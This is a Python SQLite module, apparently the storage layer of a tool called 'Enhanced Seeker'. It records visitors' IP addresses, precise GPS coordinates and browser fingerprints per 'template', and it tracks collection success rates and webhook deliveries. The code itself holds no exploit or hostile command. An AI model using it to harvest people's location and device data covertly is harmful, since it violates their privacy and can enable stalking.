"""
Database management for Enhanced Seeker
"""

import sqlite3
import json
import os
from datetime import datetime, timedelta
from contextlib import contextmanager
import logging

logger = logging.getLogger(__name__)

class Database:
    def __init__(self, db_path='seeker_data.db'):
        self.db_path = db_path
        
    @contextmanager
    def get_connection(self):
        """Get database connection with automatic cleanup"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        try:
            yield conn
        finally:
            conn.close()
            
    def init_db(self):
        """Initialize database with required tables"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            # Sessions table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id TEXT PRIMARY KEY,
                    ip_address TEXT NOT NULL,
                    user_agent TEXT,
                    template TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    status TEXT DEFAULT 'active',
                    location_data TEXT,
                    device_data TEXT,
                    accuracy REAL,
                    collection_time REAL
                )
            ''')
            
            # Location data table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS location_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    latitude REAL,
                    longitude REAL,
                    accuracy REAL,
                    altitude REAL,
                    heading REAL,
                    speed REAL,
                    collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (session_id) REFERENCES sessions (id)
                )
            ''')
            
            # Device fingerprints table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS device_fingerprints (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    canvas_fingerprint TEXT,
                    webgl_fingerprint TEXT,
                    audio_fingerprint TEXT,
                    screen_resolution TEXT,
                    timezone TEXT,
                    language TEXT,
                    platform TEXT,
                    plugins TEXT,
                    fonts TEXT,
                    collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (session_id) REFERENCES sessions (id)
                )
            ''')
            
            # Analytics table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS analytics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    date DATE NOT NULL,
                    total_sessions INTEGER DEFAULT 0,
                    successful_collections INTEGER DEFAULT 0,
                    unique_ips INTEGER DEFAULT 0,
                    avg_accuracy REAL DEFAULT 0,
                    template_stats TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Webhooks log table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS webhook_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    webhook_url TEXT NOT NULL,
                    payload TEXT,
                    response_code INTEGER,
                    response_body TEXT,
                    sent_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
            logger.info("Database initialized successfully")
            
    def save_session(self, session_data):
        """Save session information"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO sessions 
                (id, ip_address, user_agent, template, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (
                session_data['id'],
                session_data['ip'],
                session_data['user_agent'],
                session_data['template'],
                session_data['status']
            ))
            conn.commit()
            
    def save_location_data(self, session_id, data):
        """Save location and device data"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            # Save location data
            location = data.get('location', {})
            if location:
                cursor.execute('''
                    INSERT INTO location_data 
                    (session_id, latitude, longitude, accuracy, altitude, heading, speed)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (
                    session_id,
                    location.get('latitude'),
                    location.get('longitude'),
                    location.get('accuracy'),
                    location.get('altitude'),
                    location.get('heading'),
                    location.get('speed')
                ))
            
            # Save device fingerprint
            device = data.get('device', {})
            if device:
                cursor.execute('''
                    INSERT INTO device_fingerprints 
                    (session_id, canvas_fingerprint, webgl_fingerprint, audio_fingerprint,
                     screen_resolution, timezone, language, platform, plugins, fonts)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    session_id,
                    device.get('canvas_fingerprint'),
                    device.get('webgl_fingerprint'),
                    device.get('audio_fingerprint'),
                    device.get('screen_resolution'),
                    device.get('timezone'),
                    device.get('language'),
                    device.get('platform'),
                    json.dumps(device.get('plugins', [])),
                    json.dumps(device.get('fonts', []))
                ))
            
            # Update session with location data
            cursor.execute('''
                UPDATE sessions 
                SET location_data = ?, device_data = ?, accuracy = ?, status = 'data_collected'
                WHERE id = ?
            ''', (
                json.dumps(location),
                json.dumps(device),
                location.get('accuracy'),
                session_id
            ))
            
            conn.commit()
            
    def get_all_sessions(self, limit=100):
        """Get all sessions with pagination"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT * FROM sessions 
                ORDER BY created_at DESC 
                LIMIT ?
            ''', (limit,))
            return [dict(row) for row in cursor.fetchall()]
            
    def get_session_stats(self):
        """Get session statistics"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            # Total sessions
            cursor.execute('SELECT COUNT(*) as total FROM sessions')
            total_sessions = cursor.fetchone()['total']
            
            # Successful collections
            cursor.execute("SELECT COUNT(*) as successful FROM sessions WHERE status = 'data_collected'")
            successful = cursor.fetchone()['successful']
            
            # Unique IPs
            cursor.execute('SELECT COUNT(DISTINCT ip_address) as unique_ips FROM sessions')
            unique_ips = cursor.fetchone()['unique_ips']
            
            # Average accuracy
            cursor.execute('SELECT AVG(accuracy) as avg_accuracy FROM sessions WHERE accuracy IS NOT NULL')
            avg_accuracy = cursor.fetchone()['avg_accuracy'] or 0
            
            # Template stats
            cursor.execute('SELECT template, COUNT(*) as count FROM sessions GROUP BY template')
            template_stats = dict(cursor.fetchall())
            
            return {
                'total_sessions': total_sessions,
                'successful_collections': successful,
                'unique_ips': unique_ips,
                'avg_accuracy': round(avg_accuracy, 2),
                'success_rate': round((successful / total_sessions * 100) if total_sessions > 0 else 0, 2),
                'template_stats': template_stats
            }
            
    def cleanup_old_data(self, days=30):
        """Clean up old session data"""
        cutoff_date = datetime.now() - timedelta(days=days)
        
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            # Get sessions to delete
            cursor.execute('SELECT id FROM sessions WHERE created_at < ?', (cutoff_date,))
            old_sessions = [row['id'] for row in cursor.fetchall()]
            
            if old_sessions:
                # Delete related data
                cursor.execute(f'DELETE FROM location_data WHERE session_id IN ({",".join(["?" for _ in old_sessions])})', old_sessions)
                cursor.execute(f'DELETE FROM device_fingerprints WHERE session_id IN ({",".join(["?" for _ in old_sessions])})', old_sessions)
                cursor.execute(f'DELETE FROM webhook_logs WHERE session_id IN ({",".join(["?" for _ in old_sessions])})', old_sessions)
                cursor.execute('DELETE FROM sessions WHERE created_at < ?', (cutoff_date,))
                
                conn.commit()
                logger.info(f"Cleaned up {len(old_sessions)} old sessions")
                
    def log_webhook(self, session_id, webhook_url, payload, response_code, response_body):
        """Log webhook attempts"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO webhook_logs 
                (session_id, webhook_url, payload, response_code, response_body)
                VALUES (?, ?, ?, ?, ?)
            ''', (session_id, webhook_url, payload, response_code, response_body))
            conn.commit()
